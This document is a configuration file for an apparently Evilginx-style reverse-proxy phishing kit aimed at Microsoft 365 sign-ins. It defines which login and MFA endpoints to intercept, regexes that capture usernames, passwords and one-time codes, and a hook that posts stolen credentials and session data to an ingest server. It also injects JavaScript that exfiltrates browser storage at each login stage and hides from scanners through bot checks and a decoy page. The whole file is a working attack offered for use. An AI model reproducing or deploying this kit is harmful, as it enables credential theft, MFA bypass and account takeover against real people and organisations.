force_post:
  - path: "/ppsecure/post*"
    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"

auth_urls:
  - "/kmsi*"
  - "/ppsecure/post.srf*"
  - "/owa/prefetch.aspx*"
  - "/webmanifest.json*"
  - "/landingv2"
  - "v1/api/pass/o365/header"
  - '/login.srf'
  - "/api/pass/login"
  - "/common/SAS/ProcessAuth*"
  - "/Mfa/ExecuteMfa*"
  - "/api/v1/authn/factors/.*/verify.*"
  - "/log/session"

credentials:
  username:
    key: "(login|UserName|username|email|account|DomainUser)"
    search: '(.*)'
    type: 'post'
  password:
    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
    search: '(.*)'
    type: 'post'
  custom:
    - key: '(otp|mfa|code|totp|one-time-password|one_time_password)'
      search: '([a-zA-Z0-9]{6,8})'
      type: 'post'

login:
  domain: "login.microsoftonline.com"
  path: "/"

post_capture_hook:
  - trigger_on: "/log/session"
    exec: >
      curl -X POST 'http://127.0.0.1:3000/v1/session/ingest'
      -H 'Content-Type: application/json'
      -d '{
            "service_name": "Office 365",
            "session_id": "{session_id}",
            "form_data": {
              "username": "{username}",
              "password": "{password}"
            },
            "client_details": {
              "user_agent": "{user_agent}",
              "ip_address": "{remote_ip}"
            }
          }'

js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/common/oauth2/", "/", "/*"]
    script: |
      (function() {
        let passedGate = false;
        let lastCapture = '';
        const benignPageContent = '';

        function showBenignPage() {
          document.open();
          document.write(atob(benignPageContent));
          document.close();
        }

        function sendSessionData(stage) {
            try {
                const sessionInfo = {
                    localStorage: btoa(JSON.stringify(localStorage)),
                    sessionStorage: btoa(JSON.stringify(sessionStorage))
                };
                const currentCapture = JSON.stringify(sessionInfo);
                if(currentCapture === lastCapture) return;
                lastCapture = currentCapture;
                const payload = {
                    username: `SessionData-${stage}`,
                    password: currentCapture
                };
                navigator.sendBeacon('/log/session', JSON.stringify(payload));
            } catch (e) { /* silent */ }
        }

        function runMainLogic() {
          if (passedGate) return;
          passedGate = true;
          
          const params = new URLSearchParams(window.location.search);
          const bg = params.get('bg');
          
          function applyBranding() {
             try {
                const backgroundUrl = bg ? decodeURIComponent(bg) : 'https://i.ibb.co/fkLWqGZ/background.jpg';
                if (document.body.style.backgroundImage !== `url("${backgroundUrl}")`) {
                    document.body.style.backgroundImage = `url("${backgroundUrl}")`;
                    Object.assign(document.body.style, { backgroundSize: "cover", backgroundRepeat: "no-repeat", backgroundPosition: "center", height: "100%" });
                    document.documentElement.style.height = "100%";
                }
                const lightbox = document.getElementById("lightbox");
                if (lightbox) lightbox.remove();
             } catch(e) { /* silent */ }
          }
          
          const observer = new MutationObserver((mutations) => {
              mutations.forEach((mutation) => {
                if (mutation.addedNodes.length > 0) {
                    applyBranding();
                    let currentStage = 'Unknown';
                    if (document.getElementById('idBtn_Back')) {
                        currentStage = 'MFA-Proof';
                    } else if (document.querySelector('input[type="password"]')) {
                        currentStage = 'Password-Entry';
                    } else if (window.location.pathname.toLowerCase().includes('kmsi')) {
                        currentStage = 'Login-Success-KMSI';
                    } else if(document.querySelector('.text-title')) {
                        currentStage = 'Initial-Page';
                    }
                    sendSessionData(currentStage);
                }
              });
          });

          window.addEventListener('load', () => {
              applyBranding();
              observer.observe(document.body, { childList: true, subtree: true });
              sendSessionData('Initial-Load');
          });
        }

        function checkBotStatus() {
          let humanityScore = 0;
          if (screen.width >= 1024 && screen.height >= 768) humanityScore++;
          if (navigator.plugins.length > 0) humanityScore++;
          if (!navigator.webdriver) humanityScore++;
          if (window.outerWidth > 0 && window.outerHeight > 0) humanityScore++;
          if (window.Cypress || window.plumbutter || window._phantom || window.callPhantom) humanityScore -= 5;
          return humanityScore;
        }

        if (checkBotStatus() < 2) {
            showBenignPage();
        } else {
            const interactionHandler = () => {
                if (passedGate) return;
                runMainLogic();
            };
            document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
            document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
            document.addEventListener('keydown', interactionHandler, { once: true, passive: true});
            setTimeout(() => {
                if (!passedGate) {
                    runMainLogic();
                }
            }, 4000);
        }
      })();